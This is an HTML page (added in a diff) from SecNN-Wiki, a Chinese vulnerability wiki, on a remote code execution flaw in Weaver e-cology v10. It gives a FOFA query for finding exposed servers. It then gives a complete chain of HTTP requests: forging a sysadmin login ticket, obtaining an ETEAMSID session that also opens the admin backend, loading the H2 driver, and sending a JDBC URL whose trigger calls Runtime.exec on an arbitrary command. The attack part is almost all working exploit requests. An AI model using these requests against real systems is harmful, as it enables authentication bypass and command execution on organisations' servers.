@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEe-cology-v10%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>泛微e-cology-v10远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6cdb\u5faee-cology-v10\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEe-cology9_SQL%E6%B3%A8%E5%85%A5-CNVD-2023-12632/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEe-cology9_SQL%E6%B3%A8%E5%85%A5-CNVD-2023-12632/" class="btn btn-xs btn-link">
+        泛微e cology9 SQL注入 CNVD 2023 12632
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEe-cology-ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEe-cology-ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微e cology ProcessOverRequestByXml接口存在任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="e-cology-v10">泛微e-cology-v10远程代码执行漏洞<a class="headerlink" href="#e-cology-v10" title="Permanent link">&para;</a></h1>
+<p>通过e-cology-10.0的/papi/passport/rest/appThirdLogin接口传入管理员账号信息获取票据，系统依赖 H2 数据库且有 JDBC 反序列化漏洞。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">app=&quot;泛微-OA（e-cology）&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<h3 id="serviceticketid">获取serviceTicketId<a class="headerlink" href="#serviceticketid" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /papi/passport/rest/appThirdLogin HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application/x-www-form-urlencoded</span>
+<span class="nt">Content-Length</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">51</span>
+
+<span class="l l-Scalar l-Scalar-Plain">username=sysadmin&amp;service=1&amp;ip=1&amp;loginType=third</span>
+
+
+<span class="l l-Scalar l-Scalar-Plain">----</span>
+<span class="l l-Scalar l-Scalar-Plain">HTTP/1.1 200 OK</span>
+<span class="nt">Server</span><span class="p">:</span><span class="w"> </span><span class="err">******</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application/json;charset=UTF-8</span>
+<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keep-alive</span>
+<span class="nt">Date</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Tue, 20 Aug 2024 08:39:09 GMT</span>
+<span class="nt">traceId</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">f377fe57-0a32-42e8-80f8-91178393ca96</span>
+<span class="nt">Set-Cookie</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ETEAMS_TGC=TGT521-0L9GdBeMWxijLGMwbnRPEATrA9cHd9pvbaQ4sjcKA9EIgY5cBx; Path=/</span>
+<span class="nt">Access-Control-Allow-Headers</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">X-CSRFToken,Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,X-File-Name,i18n,token,appkey,userName,password,sw8,eteamsid,traceid,langType,timezoneoffset,authtoken,signature,enableTrans,routePath,tranceid,currentUrl,ebbusinessid,ebBusinessId</span>
+<span class="nt">Access-Control-Max-Age</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">86400</span>
+<span class="nt">X-XSS-Protection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">X-Content-Type-Options</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">nosniff</span>
+<span class="nt">Content-Length</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">179</span>
+
+<span class="p p-Indicator">{</span><span class="s">&quot;success&quot;</span><span class="p p-Indicator">:</span><span class="s">&quot;true&quot;</span><span class="p p-Indicator">,</span><span class="s">&quot;serviceTicketId&quot;</span><span class="p p-Indicator">:</span><span class="s">&quot;ST-591-hEd3zpL4xVLMTe9hJ0wR-http://10.0.0.1&quot;</span><span class="p p-Indicator">,</span><span class="s">&quot;message&quot;</span><span class="p p-Indicator">:</span><span class="s">&quot;登录成功&quot;</span><span class="p p-Indicator">,</span><span class="s">&quot;tgtId&quot;</span><span class="p p-Indicator">:</span><span class="s">&quot;TGT521-0L9GdBeMWxijLGMwbnRPEATrA9cHd9pvbaQ4sjcKA9EIgY5cBx&quot;</span><span class="p p-Indicator">}</span>
+</code></pre></div>
+<h3 id="eteamsid">获取ETEAMSID<a class="headerlink" href="#eteamsid" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">papi</span><span class="o">/</span><span class="n">passport</span><span class="o">/</span><span class="n">login</span><span class="o">/</span><span class="n">generateEteamsId</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">83.0.4103.116</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">56</span>
+
+<span class="n">stTicket</span><span class="o">=</span><span class="n">ST</span><span class="o">-</span><span class="mi">591</span><span class="o">-</span><span class="n">hEd3zpL4xVLMTe9hJ0wR</span><span class="o">-</span><span class="n">http</span><span class="p">:</span><span class="c1">//10.0.0.1</span>
+
+
+<span class="o">----</span>
+<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="n">OK</span>
+<span class="nl">Server</span><span class="p">:</span><span class="w"> </span><span class="o">******</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="nl">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">2024</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">51</span><span class="w"> </span><span class="n">GMT</span>
+<span class="nl">traceId</span><span class="p">:</span><span class="w"> </span><span class="n">d7c16568</span><span class="o">-</span><span class="mi">6727</span><span class="o">-</span><span class="mf">4d</span><span class="n">ab</span><span class="o">-</span><span class="n">bb87</span><span class="o">-</span><span class="n">e8f77ac37703</span>
+<span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Headers</span><span class="p">:</span><span class="w"> </span><span class="n">X</span><span class="o">-</span><span class="n">CSRFToken</span><span class="p">,</span><span class="n">Authorization</span><span class="p">,</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">,</span><span class="n">Accept</span><span class="p">,</span><span class="n">Origin</span><span class="p">,</span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">,</span><span class="n">DNT</span><span class="p">,</span><span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">,</span><span class="n">X</span><span class="o">-</span><span class="n">Mx</span><span class="o">-</span><span class="n">ReqToken</span><span class="p">,</span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">,</span><span class="n">X</span><span class="o">-</span><span class="n">File</span><span class="o">-</span><span class="n">Name</span><span class="p">,</span><span class="n">i18n</span><span class="p">,</span><span class="n">token</span><span class="p">,</span><span class="n">appkey</span><span class="p">,</span><span class="n">userName</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">sw8</span><span class="p">,</span><span class="n">eteamsid</span><span class="p">,</span><span class="n">traceid</span><span class="p">,</span><span class="n">langType</span><span class="p">,</span><span class="n">timezoneoffset</span><span class="p">,</span><span class="n">authtoken</span><span class="p">,</span><span class="n">signature</span><span class="p">,</span><span class="n">enableTrans</span><span class="p">,</span><span class="n">routePath</span><span class="p">,</span><span class="n">tranceid</span><span class="p">,</span><span class="n">currentUrl</span><span class="p">,</span><span class="n">ebbusinessid</span><span class="p">,</span><span class="n">ebBusinessId</span>
+<span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Max</span><span class="o">-</span><span class="n">Age</span><span class="p">:</span><span class="w"> </span><span class="mi">86400</span>
+<span class="n">X</span><span class="o">-</span><span class="n">XSS</span><span class="o">-</span><span class="n">Protection</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">X</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span><span class="w"> </span><span class="n">nosniff</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">114</span>
+
+<span class="p">{</span><span class="s">&quot;code&quot;</span><span class="p">:</span><span class="mi">200</span><span class="p">,</span><span class="s">&quot;msg&quot;</span><span class="p">:</span><span class="s">&quot;接口返回成功&quot;</span><span class="p">,</span><span class="s">&quot;status&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="s">&quot;data&quot;</span><span class="p">:</span><span class="s">&quot;THIRD_def423a1574e66bbdb29bc647cd8ccf6&quot;</span><span class="p">,</span><span class="s">&quot;fail&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
+</code></pre></div>
+<h3 id="orgh2driver">加载org.h2.Driver<a class="headerlink" href="#orgh2driver" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">bs</span><span class="o">/</span><span class="n">iaauthclient</span><span class="o">/</span><span class="n">base</span><span class="o">/</span><span class="n">save</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">86</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mi">10_15_7</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">127.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span>
+<span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//ip</span>
+<span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//ip/</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="nl">ETEAMSID</span><span class="p">:</span><span class="w"> </span><span class="n">THIRD_def423a1574e66bbdb29bc647cd8ccf6</span>
+
+<span class="p">{</span><span class="s">&quot;isUse&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="s">&quot;auth_type&quot;</span><span class="p">:</span><span class="s">&quot;custom&quot;</span><span class="p">,</span><span class="s">&quot;iaAuthclientCustomDTO&quot;</span><span class="p">:{</span><span class="s">&quot;ruleClass&quot;</span><span class="p">:</span><span class="s">&quot;org.h2.Driver&quot;</span><span class="p">}}</span>
+</code></pre></div>
+<h3 id="_1">执行命令<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>POST /api/dw/connSetting/testConnByBasePassword HTTP/1.1
+Host: 
+Content-Length: 199
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://ip
+Referer: http://ip/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+ETEAMSID: THIRD_18cd45709040d63b6b684d94b5773deb
+
+{&quot;dbType&quot;:&quot;mysql5&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init = CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$ //javascript\njava.lang.Runtime.getRuntime().exec(\&quot;{cmd}\&quot;)$$&quot;}
+</code></pre></div>
+<p>也可以通过上面第一步、第二步获取ETEAMSID值直接进入后台管理页面。</p>
+<h2 id="_2">漏洞来源<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/ACe_UhWsdUV3YPhUERcxsg">https://mp.weixin.qq.com/s/ACe_UhWsdUV3YPhUERcxsg</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEe-cology9_SQL%E6%B3%A8%E5%85%A5-CNVD-2023-12632/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEe-cology9_SQL%E6%B3%A8%E5%85%A5-CNVD-2023-12632/" class="btn btn-xs btn-link">
+        泛微e cology9 SQL注入 CNVD 2023 12632
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEe-cology-ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEe-cology-ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微e cology ProcessOverRequestByXml接口存在任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
